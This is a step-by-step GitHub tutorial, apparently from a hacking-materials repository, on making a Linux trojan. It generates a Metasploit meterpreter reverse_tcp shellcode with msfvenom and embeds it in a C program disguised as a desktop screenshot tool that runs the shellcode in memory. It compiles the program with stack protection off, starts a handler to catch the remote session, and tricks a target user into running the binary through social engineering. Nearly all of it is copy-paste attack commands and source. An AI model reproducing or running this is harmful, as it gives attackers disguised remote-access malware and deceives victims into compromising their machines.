#### SHELLCODE DESCRIPTION (Wikipedia)
In hacking, a shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability. It is called "shellcode" because it typically starts a command shell from which the attacker can control the compromised machine, but any piece of code that performs a similar task can be called shellcode. Because the function of a payload is not limited to merely spawning a shell, some have suggested that the name shellcode is insufficient. However, attempts at replacing the term have not gained wide acceptance. Shellcode is commonly written in machine code. 

---

<br />

#### EXERCISE DESCRIPTION
This exercise describes how to use metasploit framework to generate shellcode in C format and redirect the stdout to a text file (chars.raw).
That text file later will be used to parse the raw shellcode data into oneliner string thats going to be injected into one C Program that we also need to build to be abble to execute shellcode in target ram (running in background). This exercise also describes the use of ['MITRE ATT&CK T1113'](https://attack.mitre.org/techniques/T1113/) as social engineering technic to trick the remote user into executing our program with the promiss of taking a screenshot to current desktop and display it. As final stage we will need to use the ['GCC'](https://www.cyberciti.biz/faq/debian-linux-install-gnu-gcc-compiler/) compiler to be abble to complie our C Program into one Linux executable before send it to target user.

<br />

#### SOCIAL ENGINEERING ['wiki'](https://en.wikipedia.org/wiki/Social_engineering_(security))
Social engineering is the art of manipulating users of a computing system into revealing confidential information or into executing malicious code. In this exercise we will explore human curiosity to gain remote code execution (RCE) in remote system using the C program as a **RAT** working in background while our C program performs the function of social engineering taking a screenshot of user desktop and displaying it as promiss without him realizing that our shellcode its running in background giving us remote access to is machine.


<br />

#### MULTI-THREAD (display screenshot + execute shellcode)
In this exercise its achieved using the bash **&** operator that backgrounds the current system() call of displaying the screenshot to target user while jumping into the next C function (execute shellcode in RAM). I have to use this trick because the system() call works like the **&&** operator (bash) that waits for the process to end befor passing to the next instruction. without the use of **&** operator the C program needed to wait for user to close the screenshot befor executing the shellcode into ram, so we will have 2 process working in background (display screenshot and execute shellcode) without waiting for user intervention in the proccess.

<br />

#### STEPS REQUIRED TO ACHIEVE THIS
[1º Use Metasploit to Build Shellcode in C Format](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#3%C2%BA-use-metasploit-to-build-shellcode-in-c-format)<br />
[2º Insert the C shellcode created into our C program](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#5%C2%BA-insert-the-c-shellcode-created-into-our-c-program)<br />
[3º Use GCC to compile the C program (make it executable)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#6%C2%BA-use-gcc-to-compile-our-c-program-make-it-executable)<br />


<br />

#### LIST OF DEPENDENCIES NEEDED

<br />

| DEPENDENCIE | DESCRIPTION | FUNCTION | REQUIRED |
|---|---|---|---|
| Metasploit | Metasploit Framework | Build Shellcode + Recive Connection ( handler )| yes |
| [GCC](https://www.cyberciti.biz/faq/debian-linux-install-gnu-gcc-compiler/) | C Compiler | Compile the C Program ( make it executable ) | yes |
| [xwd](http://blog.tordeu.com/?p=135) | X Window Screenshots | Take Screenshots ( social engineering ) | optional |


<br /><br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#exercise-description)

---

### STEP-BY-STEP (HOW-TO)
Execute all commands that are inside the grey box(s) sequencialy using only your terminal (console prompt).<br />
This exercise its written to allow readers to copy/paste the all exercise without the need to call upon GUI(s) softwares.<br />

<br /><br />

#### 1º Build shellcode folder

```
sudo mkdir shellcode
cd shellcode
```

![pic](http://i63.tinypic.com/2dl9pop.png)

<br />

#### 2º Start postgresql service

```
sudo service postgresql start
```

![pic](http://i63.tinypic.com/2eoikbo.png)

<br />

#### 3º Use Metasploit to Build Shellcode in C Format
WARNING: Replace LHOST value by your local ip address<br />
WARNING: If your attacking a x64 bit system, then change the arch from -a x86 to -a x64<br />

```
sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.71 LPORT=666 -b '\x00' -a x86 --platform linux -f c -o chars.raw

```

![pic](http://i64.tinypic.com/muk5xu.png)

**'Msfvenom Syntax'**<br />
-p msfvenom payload name<br />
-b delete all null bites from shellcode **'\x00'**<br />
-a payload arch<br />
-f shellcode output format<br />
-o write output to file chars.raw<br />

<br />

#### See whats written inside chars.raw (optional)

```
cat chars.raw
```

![pic](http://i66.tinypic.com/i6xzyw.png)

<br />

#### 4º [Parse](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/bash/parsing_data_in_bash.md) shellcode data and store it into a local bash variable

```
pa=$(cat chars.raw | grep -v "=" | tr -d '";' | tr -d '\n' | tr -d ' ')
```

![pic](http://i65.tinypic.com/2090m12.png)

The shellcode data its now stored inside a bash local variable named **$pa**<br />
This variable its going to be used to embebbed the shellcode in to C Program while we are creating it using the follow commands described in the next grey box(s).<br />

<br />

#### 5º Insert the C shellcode created into our C program

```
echo "#include<stdio.h>" > payload.c
echo "#include<stdlib.h>" >> payload.c
echo "#include<string.h>" >> payload.c
echo "" >> payload.c
echo "unsigned char buf[] = \"$pa\";" >> payload.c
echo "" >> payload.c
echo "int main()" >> payload.c
echo "{" >> payload.c
echo "  printf(\"\\nPlease Wait, Taking Screenshot ..\n...\", strlen(buf));" >> payload.c
echo "  system(\"sleep 1; xwd -root -out /tmp/ScreenShot.xwd\");" >> payload.c
echo "  system(\"sleep 1; xwud -in /tmp/ScreenShot.xwd &\");" >> payload.c
echo "  void (*ret)() = (void(*)())buf;" >> payload.c
echo "  ret();" >> payload.c
echo "}" >> payload.c
```

![pic](http://i67.tinypic.com/309rd74.png)

<br />

#### See whats written inside payload.c (optional)

```
cat payload.c
```

![pic](http://i68.tinypic.com/24y1ojb.png)

<br />

#### 6º Use GCC to compile our C program (make it executable)

```
sudo gcc -fno-stack-protector -z execstack payload.c -o desktop_screenshot
```

![pic](http://i68.tinypic.com/15klg4.png)

<br />

#### 7º Start metasploit multi handler
WARNING: Replace LHOST value by your local ip address<br />
WARNING: If your attacking a x64 bit system, then change the arch from -a x86 to -a x64<br />

```
sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit'
```

![pic](http://i68.tinypic.com/15wlyxs.png)

<br />

#### 8º Execution of the C Program (in remote machine)

```
chmod +x desktop_screenshot
sudo ./desktop_screenshot
```

![pic](http://i67.tinypic.com/16h9sax.png)

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#exercise-description)

---

<br />

#### Video Tutorial

[C Shellcode Linux - Video Tutorial](https://blablabla.)

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#exercise-description)

---

### Suspiciou Shell Activity - RedTeam @2019


